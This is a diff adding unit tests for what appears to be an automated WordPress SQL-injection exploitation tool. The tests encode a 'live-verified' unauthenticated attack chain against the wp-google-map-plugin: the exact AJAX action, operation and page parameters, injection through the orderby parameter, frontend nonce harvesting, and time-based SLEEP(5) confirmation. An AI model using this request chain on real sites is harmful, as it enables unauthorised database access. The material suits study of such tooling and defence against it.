@@ -73,3 +73,52 @@ def test_sqli_recipe_present_for_farm_plugin():
     assert r[0]["cve"] == "CVE-2026-2580"
     assert r[0]["inject_param"] == "orderby"
     assert r[0]["affected"] == "<=4.9.1"
+
+
+# ── real wp-google-map-plugin request shape (live-verified) ───────────────────
+def test_gmap_recipe_real_unauth_chain():
+    r = wp_recipes.find_sqli("wp-google-map-plugin")[0]
+    # POST dispatch, but the orderby sink is a $_GET read
+    assert r["method"] == "POST" and r["inject_in"] == "params"
+    assert r["data"]["action"] == "wpgmp_ajax_call"
+    assert r["data"]["operation"] == "wpgmp_processor"
+    assert r["params"]["page"] == "wpgmp_manage_map"
+    # fc-call-nonce harvested off the frontend into the POST body
+    assert r["nonce_from"]["into"] == "data" and r["nonce_from"]["param"] == "nonce"
+
+
+def test_timed_inject_in_params_overrides_post_default():
+    http = MagicMock()
+    r = {**RECIPE, "method": "POST", "inject_in": "params",
+         "data": {"action": "wpgmp_ajax_call"}}
+    wp_sqli._timed("http://t", http, r, "1=1", 5)
+    _, kwargs = http.post.call_args
+    # sink rides the query string; the POST body is left untouched
+    assert "SLEEP(5)" in kwargs["params"]["orderby"]
+    assert "orderby" not in kwargs["data"]
+    assert kwargs["data"]["action"] == "wpgmp_ajax_call"
+
+
+def test_resolve_nonce_harvests_into_data_without_mutating_original():
+    http = MagicMock()
+    http.get.return_value = MagicMock(text='var o={"nonce":"a1b2c3d4"};')
+    r = {**RECIPE, "method": "POST", "data": {"action": "wpgmp_ajax_call"},
+         "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"}}
+    out = wp_sqli._resolve_nonce("http://t", http, r)
+    assert out["data"]["nonce"] == "a1b2c3d4"
+    assert out["data"]["action"] == "wpgmp_ajax_call"     # existing body preserved
+    assert r["data"] == {"action": "wpgmp_ajax_call"}     # original untouched
+
+
+def test_confirm_harvests_nonce_once_then_times(monkeypatch):
+    http = MagicMock()
+    http.get.return_value = MagicMock(text='{"nonce":"deadbeef01"}')
+    seen = []
+    monkeypatch.setattr(wp_sqli, "_timed",
+                        lambda b, h, rec, cond, sleep: (seen.append(rec) or
+                                                        (0.1 if sleep == 0 else 5.3)))
+    r = {**RECIPE, "method": "POST", "data": {"action": "x"},
+         "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"}}
+    out = wp_sqli.confirm("http://t", http, r, delay=5)
+    assert out["confirmed"] is True
+    assert seen and all(rec["data"]["nonce"] == "deadbeef01" for rec in seen)
